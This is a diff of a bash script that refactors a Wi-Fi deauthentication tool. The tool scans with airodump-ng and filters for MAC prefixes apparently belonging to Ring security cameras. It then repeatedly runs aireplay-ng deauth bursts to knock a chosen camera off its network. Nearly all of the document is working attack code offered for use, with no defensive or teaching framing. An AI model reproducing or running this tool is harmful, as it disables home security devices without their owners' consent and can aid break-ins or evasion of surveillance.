@@ -48,29 +48,15 @@ custom_exit() {
     exit 1 # Exit the script
 }
 
-# Airodump scan function
-airodump_scan() {
-    printf 'Executing airodump-ng..\nPress Ctrl+C to stop the capture and press the A key to cycle between modes while viewing\n'
-    sleep 3; clear
-    sudo airodump-ng -i $INF --manufacturer -w /tmp/rdos/airodump --output-format csv
-}
-
-# Aireplay attack start
-aireplay_attack() {
-    printf "\e[1;97mStation MAC, First time seen, Last time seen, Power, # packets, BSSID, Probed ESSIDs\n\e[0m"
-    grep --color -E '54:E0:19|5C:47:5E|9C:76:13|34:3E:A4|64:9A:63|90:48:6C' /tmp/rdos/airodump*.csv
-    read -p "Enter BSSID of target: " BSSID
-    read -p "Enter MAC of target: " MAC
-}
-
 # Set up the custom action for Ctrl+C
 trap custom_interrupt SIGINT
+trap custom_exit EXIT
 
 # Prechecks before script runs
 # Check for root
 if [ "$EUID" -ne 0 ]; then 
     printf "Please run as root\n"
-    sleep 2; custom_exit
+    sleep 2; exit 1
 fi
 
 # Print logo art
@@ -81,7 +67,7 @@ if which aircrack-ng | grep -q 'aircrack-ng'; then
     printf 'aircrack-ng toolkit check passed!\n'
 else    
     printf "aircrack-ng toolkit check failed. Make sure it's installed before continuing!\n"
-    sleep 2; custom_exit
+    sleep 2; exit 1
 fi
 
 # Check for iwconfig
@@ -89,7 +75,7 @@ if which iwconfig | grep -q 'iwconfig'; then
     printf 'iwconfig check passed!\n'
 else    
     printf "iwconfig check failed. Make sure it's installed before continuing!\n"
-    sleep 2; custom_exit
+    sleep 2; exit 1
 fi
 
 # Clear screen and reprint art
@@ -120,125 +106,232 @@ for key in "${!interface_map[@]}"; do
 done
 
 # Prompt the user for their choice
-read -p "Enter the number of the wireless interface you want to use: " choice
-
-# Validate the choice
-if [[ -n ${interface_map[$choice]} ]]; then
-    ITMP="${interface_map[$choice]}"
-else
-    printf "Invalid choice. Please enter a valid number.\n"
-    custom_exit
-fi
+while true; do
+    read -p "Enter the number of the wireless interface you want to use: " choice
+    # Validate the choice
+    if [[ -n ${interface_map[$choice]} ]]; then
+        ITMP="${interface_map[$choice]}"
+        break
+    else
+        printf "Invalid choice. Please enter a valid number.\n"
+    fi
 
 # Grabs the users new wireless interface that is in monitor mode
 INF=$(sudo airmon-ng start $ITMP | grep -oP '\b\w+mon\b' | awk '!/airmon|daemon/')
 sleep 1; clear
 
+# Airodump scan function
+airodump_scan() {
+    printf 'Executing airodump-ng..\nPress Ctrl+C to stop the capture and press the A key to cycle between modes while viewing\n'
+    sleep 3; clear
+    sudo airodump-ng -i $INF --manufacturer -w /tmp/rdos/airodump --output-format csv
+}
+
 # Run airodump 
 airodump_scan
 
-# Search for ring devices
-# Check if any devices don't match the filter
-if ! grep -qE '54:E0:19|5C:47:5E|9C:76:13|34:3E:A4|64:9A:63|90:48:6C' /tmp/rdos/airodump*.csv; then
-    while true; do
-        clear
-        print_centered_text '\e[1;31mNo ring devices found!\e[0m\n'
-        sleep 2
-        clear
-        read -p "Do you want to run the scan again?[y/n]: " choice1
-        case "$choice1" in
-            [Yy]*)
-                # Remove the previous airodump output
-                sudo rm -r /tmp/rdos/airodump*
-                # Start airodump-ng
-                airodump_scan
-                if grep -qE '54:E0:19|5C:47:5E|9C:76:13|34:3E:A4|64:9A:63|90:48:6C' /tmp/rdos/airodump*.csv; then # Check if devices match the filter
-                    clear
-                    print_centered_text '\e[1;31mRing devices found!\e[0m'
-                    sleep 1
-                    break
-                fi
-                ;;
-            [Nn]*)
-                custom_exit
-                ;;
-            *)
-                printf "Invalid choice. Please enter 'y' or 'n'.\n"
-                ;;
-        esac
-    done
-else
-    # Print the header
-    clear
-    print_centered_text '\e[1;31mRing devices found!\e[0m'
-    sleep 1
-fi
-
-
-# Aireplay attack start
-clear
-aireplay_attack
-
-CHNL=$(awk -F, -v BSSID="$BSSID" '$0 ~ BSSID {split($0, fields, ",");channel = gensub(/[^0-9]+/, "", "g", fields[4]); if (channel <= 13) print channel}' /tmp/rdos/airodump*.csv)
-if [ -z "$CHNL" ]; then
-    while true; do
-        printf "Note: The BSSID specfied isn't on a channel which may mean there was an error in selecting the BSSID.\n If you continue, \e[1$INF\e[0m will stay as it is and not be swapped to a specific channel.\n"
-        read -p "Would you like to go back?[y/n]: " choice2
-        case "$choice2" in
-            [Yy]*)
-                printf "Returning to aireplay attack prompt.\n"
-                clear
-                aireplay_attack
-                if [ ! -z "$CHNL" ]; then
-                    break
-                fi
-                ;;
-            [Nn]*)
-                break
-                ;;
-            *)
-                printf "Invalid choice. Please enter 'y' or 'n'.\n"
-        esac
-    done
-else
-    printf "Setting the monitor channel to the same channel the target AP is on...\n"
-    sudo airmon-ng stop $INF 
-    sudo airmon-ng start $ITMP $CHNL
-fi
-clear
-
-
-while true; do
-    printf "Attemping to dissasociate \e[1;97m$MAC\e[0m...\n"
-    aireout=$(sudo aireplay-ng -0 100 -a $BSSID -c $MAC $INF | tee /dev/tty) # Running the aireplay attack into a variable aireout so grep can read the output
-    
-    if echo "$aireout" | grep -q "No such BSSID available"; then
+# ring filter search function
+ring_filter_search() {
+    if ! grep -qE '54:E0:19|5C:47:5E|9C:76:13|34:3E:A4|64:9A:63|90:48:6C' /tmp/rdos/airodump*.csv; then
         while true; do
-            read -p "Would you like to run aireplay-ng again?[y/n]: " choice3
-            case "$choice3" in
+            clear
+            print_centered_text '\e[1;31mNo ring devices found!\e[0m\n'
+            sleep 2
+            clear
+            read -p "Do you want to run the scan again?[y/n(exit)]: " choice1
+            case "$choice1" in
                 [Yy]*)
-                    printf "Running aireplay-ng again...\n"
-                    clear
-                    aireloopout=$(sudo aireplay-ng -0 100 -a $BSSID -c $MAC $INF | tee /dev/tty)
-                    printf "$aireloopout\n"
-                    if ! echo "$aireloopout" | grep -q "No such BSSID available"; then
+                    # Remove the previous airodump output
+                    sudo rm -r /tmp/rdos/airodump*
+                    # Start airodump-ng
+                    airodump_scan
+                    if grep -qE '54:E0:19|5C:47:5E|9C:76:13|34:3E:A4|64:9A:63|90:48:6C' /tmp/rdos/airodump*.csv; then # Check if devices match the filter
+                        clear
+                        print_centered_text '\e[1;31mRing devices found!\e[0m'
+                        sleep 1
                         break
                     fi
                     ;;
                 [Nn]*)
-                    custom_exit
+                    exit 0
+                    ;;
+                *)
+                    printf "Invalid choice. Please enter 'y' or 'n'.\n"
+                    ;;
+            esac
+        done
+    else
+        # Print the header
+        clear
+        print_centered_text '\e[1;31mRing devices found!\e[0m'
+        sleep 1
+    fi
+}
+
+# Run ring filter search function
+ring_filter_search
+
+clear
+
+# Pre aireplay attack function
+pre_aireplay_attack() {
+    printf "\e[1;97mStation MAC, First time seen, Last time seen, Power, # packets, BSSID, Probed ESSIDs\n\e[0m"
+    grep --color -E '54:E0:19|5C:47:5E|9C:76:13|34:3E:A4|64:9A:63|90:48:6C' /tmp/rdos/airodump*.csv
+
+    # Function to validate if a string is a valid MAC address
+    is_valid_mac() {
+        local mac="$1"
+        # Use a regular expression to match the MAC address format
+        if [[ $mac =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]]; then
+            return 0  # Valid MAC address
+        else
+            return 1  # Invalid MAC address
+        fi
+    }
+
+    while true; do
+        read -p "Enter BSSID of target: " BSSID
+        read -p "Enter MAC of target: " MAC
+
+        bssid_valid=0
+        mac_valid=0
+
+        # Check if BSSID is a valid MAC address
+        if is_valid_mac "$BSSID"; then
+            bssid_valid=1
+        else
+            printf "Invalid BSSID. Please enter a valid MAC address.\n"
+        fi
+
+        # Check if MAC is a valid MAC address
+        if is_valid_mac "$MAC"; then
+            mac_valid=1
+        else
+            printf "Invalid MAC address. Please enter a valid MAC address.\n"
+        fi
+
+        # Check both validity conditions
+        if [ $bssid_valid -eq 1 ] && [ $mac_valid -eq 1 ]; then
+            break  # Exit the loop when both are valid
+        fi
+    done
+
+    CHNL=$(awk -F, -v BSSID="$BSSID" '$0 ~ BSSID {split($0, fields, ",");channel = gensub(/[^0-9]+/, "", "g", fields[4]); if (channel <= 13) print channel}' /tmp/rdos/airodump*.csv)
+    if [ -z "$CHNL" ]; then
+        while true; do
+            printf "Note: The BSSID specfied isn't on a channel which may mean there was an error in selecting the BSSID.\n If you continue, \e[1;$INF\e[0m will stay as it is and not be swapped to a specific channel.\n"
+            read -p "Would you like to go back?[y/n]: " choice2
+            case "$choice2" in
+                [Yy]*)
+                    echo "Returning to aireplay attack prompt."
+                    clear
+                    printf "\e[1;97mStation MAC, First time seen, Last time seen, Power, # packets, BSSID, Probed ESSIDs\n\e[0m"
+                    grep --color -E '54:E0:19|5C:47:5E|9C:76:13|34:3E:A4|64:9A:63|90:48:6C' /tmp/rdos/airodump*.csv
+                    read -p "Enter BSSID of target: " BSSID
+                    read -p "Enter MAC of target: " MAC
+                    if [ ! -z "$CHNL" ]; then
+                        break
+                    fi
+                    ;;
+                [Nn]*)
+                    break
                     ;;
                 *)
                     printf "Invalid choice. Please enter 'y' or 'n'.\n"
             esac
         done
     else
-        printf "Dissasociation attack completed successfully\n"
-        custom_exit
-        break
+        printf "Setting $INF to station mode.\n"
+        sudo airmon-ng stop $INF > /dev/null 2>&1
+        printf "Setting $INMP to monitor on channel $CHNL.\n"
+        sudo airmon-ng start $ITMP $CHNL > /dev/null 2>&1
     fi
+}
+
+# Run the pre_aireplay_attack function
+pre_aireplay_attack
+
+clear
+
+# Start aireplay attack function
+start_aireplay_attack() {
+    while true; do
+        printf "Attemping to dissasociate \e[1;97m$MAC\e[0m...\n"
+        aireout=$(sudo aireplay-ng -0 100 -a $BSSID -c $MAC $INF | tee /dev/tty) # Running the aireplay attack into a variable aireout so grep can read the output
+        
+        if echo "$aireout" | grep -q "No such BSSID available"; then
+            while true; do
+                read -p "Would you like to run aireplay-ng again?[y/n(exit)]: " choice3
+                case "$choice3" in
+                    [Yy]*)
+                        printf "Running aireplay-ng again...\n"
+                        clear
+                        aireloopout=$(sudo aireplay-ng -0 100 -a $BSSID -c $MAC $INF | tee /dev/tty)
+                        printf "$aireloopout\n"
+                        if ! echo "$aireloopout" | grep -q "No such BSSID available"; then
+                            break
+                        fi
+                        ;;
+                    [Nn]*)
+                        exit 0
+                        ;;
+                    *)
+                        printf "Invalid choice. Please enter 'y' or 'n'.\n"
+                        clear
+                esac
+            done
+        else
+            printf "Dissasociation attack completed successfully\n"
+            break
+        fi
+    done
+}
+
+# Run the start_aireplay_attack function
+start_aireplay_attack 
+
+# Function to display the menu
+display_menu() {
+    clear
+    printf "You have reached the end of this script. Select the next option:"
+    echo "**********************************************"
+    echo "1. Restart Script"
+    echo "2. Run Aireplay Attack Again"
+    echo "3. Quit"
+    echo "**********************************************"
+}
+
+# End menu loop
+while true; do
+    display_menu
+    read -p "Please select: " choice4
+    case "$choice4" in
+        1)
+            clear
+            printf "Restarting the script...\n"
+            sleep 2
+            airodump_scan
+            ring_filter_search
+            pre_aireplay_attack
+            start_aireplay_attack
+            ;;
+        2)
+            clear
+            printf "Running Aireplay Attack again...\n"
+            sleep 2
+            start_aireplay_attack
+            ;;
+        3)
+            clear
+            exit 0
+            ;;
+        *)
+            clear
+            printf "Invalid choice. Please enter 1, 2, or 3.\n"
+            sleep 2
+            ;;
+    esac
 done
 
-
-
+exit 0
 
